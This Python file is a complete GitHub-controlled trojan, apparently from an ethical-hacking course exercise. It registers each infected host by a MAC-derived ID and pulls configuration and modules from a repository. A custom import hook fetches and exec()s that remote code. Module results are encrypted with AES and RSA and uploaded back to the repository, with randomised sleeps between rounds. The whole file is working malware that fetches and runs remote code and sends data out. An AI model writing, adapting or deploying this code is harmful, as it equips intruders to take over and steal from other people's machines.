import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import uuid

import string
import hashlib
from Crypto import Random
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

import string
import hashlib
from Crypto import Random
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

from datetime import datetime


def github_connect():
    with open('mytoken.txt') as f:
        token = f.read().strip()
    user = 'WatcherWhale'
    sess = github3.login(token=token)
    return sess.repository(user, 'EH_Week8')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        try:
            print("[*] Attempting to retrieve %s" % name)
            self.repo = github_connect()

            new_library = get_file_contents('modules', f'{name}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        except:
            print("[x] Failed to import " + name)

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None,
                                               origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def is_registered(self, comp_id):
        return len(list(filter(lambda x: x[0] == comp_id, self.repo.directory_contents("data/registered")))) > 0

    def register(self):
        comp_id = hex(uuid.getnode())
        if not self.is_registered(comp_id):
            self.repo.create_file("data/registered/" + comp_id, comp_id, comp_id.encode())

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'

        password = self.get_password()
        enc_pass = self.encrypt_rsa(password)

        bindata = self.encrypt(data, password)

        out_data = base64.b64encode(enc_pass).decode() + "." + bindata

        self.repo.create_file(remote_path, message, out_data.encode())

    def get_key(self):
        key = get_file_contents('keys', 'pub.key', self.repo)
        return base64.b64decode(key)

    def get_password(self):
        return ''.join(random.choice(string.ascii_letters) for i in range(32)).encode()

    def encrypt(self, data, password):
        private_key = hashlib.sha256(password).digest()

        BLOCK_SIZE = 16
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

        raw = pad(base64.b64encode(data).decode()).encode()
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(private_key, AES.MODE_CBC, iv)

        return base64.b64encode(iv + cipher.encrypt(raw)).decode()

    def encrypt_rsa(self, data):
        public_key = self.get_key()
        public_key = RSA.importKey(public_key)
        public_key = PKCS1_OAEP.new(public_key)

        return public_key.encrypt(data)

    def run(self):
        self.register()
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('config')
    trojan.run()
